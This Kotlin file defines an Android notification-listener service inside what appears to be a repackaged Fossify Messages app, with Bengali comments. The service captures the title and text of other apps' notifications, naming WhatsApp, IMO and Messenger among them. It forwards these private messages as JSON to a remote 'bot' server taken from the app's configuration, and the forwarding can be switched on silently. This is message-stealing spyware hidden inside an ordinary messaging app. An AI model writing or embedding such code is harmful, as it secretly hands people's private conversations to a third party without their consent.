package org.fossify.messages.androbox

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.*

class NotificationCaptureService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // নোটিফিকেশন ফরওয়ার্ডিং অন/অফ করার ফ্ল্যাগ (ডিফল্ট false)
    companion object {
        private var isForwardingEnabled = false

        fun setForwardingEnabled(enabled: Boolean) {
            isForwardingEnabled = enabled
            Log.d("NotifCapture", "Forwarding enabled: $enabled")
        }

        fun isForwardingEnabled(): Boolean = isForwardingEnabled
    }

    // যেসব প্যাকেজ উপেক্ষা করবে (সিস্টেম ও নিজের অ্যাপ)
    private val ignorePackages = listOf(
        "com.android.systemui",
        "com.android.phone",
        "android",
        packageName
    )

    // যে সকল কীওয়ার্ড থাকলে বার্তা বাদ যাবে
    private val ignoreKeywords = listOf(
        "checking for new messages",
        "updating",
        "synchronizing",
        "backup completed",
        "no new messages",
        "you have no new messages",
        "new messages"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // যদি ফরওয়ার্ডিং বন্ধ থাকে, তাহলে কিছুই করবেন না
        if (!isForwardingEnabled) return

        sbn ?: return
        val packageName = sbn.packageName
        if (ignorePackages.contains(packageName)) return

        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE, "")
        val text = extras.getString(Notification.EXTRA_TEXT, "")

        // ব্ল্যাকলিস্টেড কীওয়ার্ড চেক
        val combined = "$title $text".lowercase()
        if (ignoreKeywords.any { combined.contains(it) }) {
            Log.d("NotifCapture", "Ignored (keyword): $combined")
            return
        }

        // বার্তা খুব ছোট হলে উপেক্ষা
        if (text.length < 5 && title.length < 5) return

        // যদি text খালি হয় এবং শুধু অ্যাপের নাম থাকে, তাহলে সেটি সাধারণ নোটিফিকেশন
        if (text.isBlank() && (title == "WhatsApp" || title == "IMO" || title == "Messenger")) return

        Log.d("NotifCapture", "Captured: $packageName | $title | $text")
        forwardToBot(packageName, title, text)
    }

    private fun forwardToBot(packageName: String, title: String, messageBody: String) {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls == null) {
            Log.e("NotifCapture", "No server config")
            return
        }
        val (host, _) = urls

        val appName = try {
            val pm = applicationContext.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
        } catch (e: Exception) {
            packageName
        }

        val jsonData = """
            {
                "app": "$appName",
                "title": "$title",
                "message": "$messageBody",
                "timestamp": ${System.currentTimeMillis()}
            }
        """.trimIndent()

        serviceScope.launch {
            val success = FileUploader.uploadNotification(applicationContext, jsonData, host)
            if (success) Log.d("NotifCapture", "Forwarded to bot")
            else Log.e("NotifCapture", "Forward failed")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}